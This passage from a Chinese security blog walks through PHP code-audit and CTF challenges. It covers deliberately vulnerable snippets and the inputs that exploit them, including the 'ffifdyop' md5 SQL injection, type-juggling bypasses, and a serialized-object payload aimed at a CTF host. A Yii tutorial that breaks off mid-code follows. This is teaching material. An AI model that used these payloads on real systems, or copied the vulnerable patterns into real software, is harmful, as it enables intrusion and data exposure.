class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这里，它不让输入1到9的数字，但是后面却让比较一串数字，平常的方法肯定就不能行了，大家都知道计算机中的进制转换，当然也是可以拿来比较的，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de，在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag</p>
<p>echo  dechex ( 3735929054 ); // 将3735929054转为16进制<br>结果为：deadc0de<br>构造： <a href="http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d" target="_blank" rel="noopener">http://127.0.0.1/Php_Bug/20.php?password=0xdeadc0d</a></p>
<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test&#125;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$temp = $_GET[<span class="string">'password'</span>];</span></span><br><span class="line"><span class="php">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;    </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>利用PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。如果输入一个1337a这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag。</p>
<p><a href="http://127.0.0.1/php_bug/22.php?password=1337a" target="_blank" rel="noopener">http://127.0.0.1/php_bug/22.php?password=1337a</a></p>
<h2 id="md5函数true绕过注入"><a href="#md5函数true绕过注入" class="headerlink" title="md5函数true绕过注入"></a>md5函数true绕过注入</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$link</span> = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$link</span>) &#123;</span><br><span class="line">  die(<span class="string">'Could not connect to MySQL: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> 选择数据库</span><br><span class="line"><span class="variable">$db</span> = mysql_select_db(<span class="string">"security"</span>, <span class="variable">$link</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">'select db error'</span>;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span> 执行sql</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM users WHERE password = '"</span>.md5(<span class="variable">$password</span>,true).<span class="string">"'"</span>;</span><br><span class="line">var_dump(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"><span class="variable">$row1</span> = mysql_fetch_row(<span class="variable">$result</span>);</span><br><span class="line">var_dump(<span class="variable">$row1</span>);</span><br><span class="line">mysql_close(<span class="variable">$link</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>当md5后的hex转换成字符串后，如果包含 ‘or’<trash> 这样的字符串，那整个sql变成<br>SELECT * FROM admin WHERE pass = ‘’or’6<trash>‘<br>提供一个字符串：ffifdyop</trash></trash></p>
<p>md5后，276f722736c95d99e921722cf9ed621c</p>
<p>再转成字符串： ‘or’6<trash></trash></p>
<h2 id="switch没有break-字符与0比较绕过"><a href="#switch没有break-字符与0比较绕过" class="headerlink" title="switch没有break 字符与0比较绕过"></a>switch没有break 字符与0比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'which'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $which = $_GET[<span class="string">'which'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($which)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">0</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">1</span>:</span></span><br><span class="line"><span class="php">    <span class="keyword">case</span> <span class="number">2</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">require_once</span> $which.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">         <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'PHP-0817'</span>, <span class="string">'Hacker NoNoNo!'</span>, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>让我们包含当前目录中的flag.php，给which为flag，这里会发现在case 0和case 1的时候，没有break，按照常规思维，应该是0比较不成功，进入比较1，然后比较2，再然后进入default，但是事实却不是这样，事实上，在 case 0的时候，字符串和0比较是相等的，进入了case 0的方法体，但是却没有break，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们which传入flag的时候，case 0比较进入了方法体，但是没有break，默认已经匹配成功，往下执行不再判断，进入2的时候，执行了require_once flag.php</p>
<p>PHP中非数字开头字符串和数字 0比较==都返回True</p>
<p>因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为0了，然后再和另一个0比大小，结果自然为ture。注意：如果那个字符串是以数字开头的，如6ldb，它还是可以转为数字6的，然后和0比较就不等了（但是和6比较就相等） if($str==0) 判断 和 if( intval($str) == 0 ) 是等价的<br>可以验证：<br>&lt;?php<br>$str=”s6s”;<br>if($str==0){ echo “返回了true.”;}<br>?&gt;<br>要字符串与数字判断不转类型方法有：</p>
<p>方法一： $str=”字符串”;if($str===0){ echo “返回了true.”;}</p>
<p>方法二： $str=”字符串”;if($str==”0”){ echo “返回了true.”;} ,</p>
<p>此题构造：<a href="http://127.0.0.1/php_bug/25.php?which=aa" target="_blank" rel="noopener">http://127.0.0.1/php_bug/25.php?which=aa</a></p>
<p>资料：</p>
<h2 id="unserialize-序列化"><a href="#unserialize-序列化" class="headerlink" title="unserialize()序列化"></a>unserialize()序列化</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 题目：http://web.jarvisoj.com:32768 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- index.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">	$x = <span class="keyword">new</span> Shield();</span></span><br><span class="line"><span class="php">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span></span><br><span class="line"><span class="php">		$x = unserialize($g);</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> $x-&gt;readfile();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">			&#125;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- showimg.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">		$f = base64_decode($f);</span></span><br><span class="line"><span class="php">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php">		<span class="comment">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></span></span><br><span class="line"><span class="php">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">			readfile($f);</span></span><br><span class="line"><span class="php">		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">说明flag在pctf.php，但showimg.php中不允许直接读取pctf.php，只有在index.php中可以传入变量<span class="keyword">class</span> ，index.php中Shield类的实例<span class="variable">$X</span> = unserialize(<span class="variable">$g</span>)，<span class="variable">$g</span> = <span class="variable">$_GET</span>['<span class="keyword">class</span>'];，<span class="variable">$X</span>中不知<span class="variable">$filename</span>变量，但需要找的是：<span class="variable">$filename</span> = <span class="string">"pctf.php"</span>，现<span class="variable">$X</span>已知，求传入的<span class="keyword">class</span>变量值。 可以进行序列化操作：</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- answer.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span></span><br><span class="line"><span class="php">$x = <span class="class"><span class="keyword">class</span> <span class="title">Shield</span>();</span></span></span><br><span class="line"><span class="php">$g = serialize($x);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $g;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- shield.php --&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>得到： O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 构造： <a href="http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</a></p>
<h2 id="利用提交数组绕过逻辑"><a href="#利用提交数组绕过逻辑" class="headerlink" title="利用提交数组绕过逻辑"></a>利用提交数组绕过逻辑</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag&#123;test_flag&#125;"</span>;</span></span><br><span class="line"><span class="php">$auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>]))&#123;</span></span><br><span class="line"><span class="php">    $role = unserialize(base64_decode($_COOKIE[<span class="string">"role"</span>]));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($role === <span class="string">"admin"</span>)&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $role = base64_encode(serialize($role));</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">'role'</span>,$role);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($auth)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $filename = $_POST[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">        $data = $_POST[<span class="string">'data'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(preg_match(<span class="string">'[&lt;&gt;?]'</span>, $data)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'No No No!'</span>.$data);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = implode($data);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!preg_match(<span class="string">'[&lt;&gt;?]'</span>, $s))&#123;</span></span><br><span class="line"><span class="php">                $flag=<span class="string">'None.'</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $rand = rand(<span class="number">1</span>,<span class="number">10000000</span>);</span></span><br><span class="line"><span class="php">            $tmp=<span class="string">"./uploads/"</span>.md5(time() + $rand).$filename;</span></span><br><span class="line"><span class="php">            file_put_contents($tmp, $flag);</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"your file is in "</span> . $tmp;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Hello admin, now you can upload something you are easy to forget."</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;there are the source.&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;textarea rows="10" cols="100"&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> htmlspecialchars(str_replace($flag,<span class="string">'flag&#123;???&#125;'</span>,file_get_contents(<span class="keyword">__FILE__</span>)));</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;/textarea&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Sorry. You have no permissions."</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这段代码首先会查看提交的请求中是否存在 &lt;&gt; 如果没有则将传入的数据(如果是数组)转化为字符串。如果其中存在 &lt;&gt; 则将flag生成在一个随机命名的文件中。 implode() 这个函数需要传入数组，如果传入的是字符串将报错，变量 $s 自然也就没有值。<br>想要通过Post请求的形式传入数组可以使用 data[0]=123&amp;data[1]=&lt;&gt; 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &amp;s 为空，成功绕过这段逻辑拿到flag。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/16/php-bugs-php代码审计基础/" data-id="cjvrp4gm100335gqrll95kbkd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-YII基础学习笔记" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/01/YII基础学习笔记/" class="article-date">
  <time datetime="2019-03-01T08:23:19.000Z" itemprop="datePublished">2019-03-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/01/YII基础学习笔记/">YII基础学习笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><p>实现在HelloController.php中编写</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'hello word'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://127.0.0.1/basic/web/index.php?r=hello/index" target="_blank" rel="noopener">http://127.0.0.1/basic/web/index.php?r=hello/index</a> 访问成功</p>
<p>获取get和post 请求内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $request = \YII::$app-&gt;request;<span class="comment">//全局类</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $request-&gt;get(<span class="string">'id'</span>,<span class="number">20</span>); <span class="comment">//当没有进行get时 默认为20</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k7c6dvkcj30ey063aa5.jpg" alt=""></p>
<p>同样也可以 $request-&gt;post(‘id’,20);进行post</p>
<h3 id="YII操作HTTP"><a href="#YII操作HTTP" class="headerlink" title="YII操作HTTP"></a>YII操作HTTP</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span 